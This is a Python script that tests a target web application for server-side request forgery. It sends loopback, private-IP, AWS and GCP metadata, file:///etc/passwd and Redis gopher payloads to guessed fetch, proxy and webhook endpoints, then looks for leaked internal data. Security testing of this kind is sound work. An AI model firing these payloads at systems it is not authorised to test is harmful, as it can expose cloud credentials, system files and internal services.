#!/usr/bin/env python3
"""
test_ssrf.py - Server-Side Request Forgery Testing Script
Usage: python test_ssrf.py <target_url>
"""

import sys
import requests
from urllib.parse import urljoin

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://metadata.google.internal/",           # GCP metadata
    "http://192.168.1.1",
    "http://10.0.0.1",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",             # Redis
]

def test_ssrf(base_url):
    print(f"=== SSRF Test ===")
    print(f"Target: {base_url}\n")
    
    vulnerable = []
    test_endpoints = ["/api/fetch?url={}", "/api/proxy?target={}", "/api/webhook?callback={}"]
    
    for endpoint in test_endpoints:
        for payload in SSRF_PAYLOADS:
            url = urljoin(base_url, endpoint.format(payload))
            try:
                resp = requests.get(url, timeout=10)
                
                # Check for internal data leakage
                indicators = ["root:", "ami-id", "instance-id", "hostname", "private", "redis"]
                if any(ind in resp.text.lower() for ind in indicators):
                    print(f"[!] SSRF detected: {endpoint}")
                    print(f"    Payload: {payload}")
                    vulnerable.append((endpoint, payload))
                    break
                    
                # Check if response differs from normal error
                if resp.status_code == 200 and len(resp.text) > 100:
                    print(f"[?] Possible SSRF: {endpoint}")
                    print(f"    Payload: {payload} - got 200 with content")
                    
            except requests.exceptions.RequestException:
                pass
    
    print(f"\n=== Results ===")
    if vulnerable:
        print(f"[CRITICAL] Found {len(vulnerable)} SSRF vulnerabilities!")
    else:
        print("[OK] No obvious SSRF vulnerabilities detected.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        sys.exit(1)
    test_ssrf(sys.argv[1])
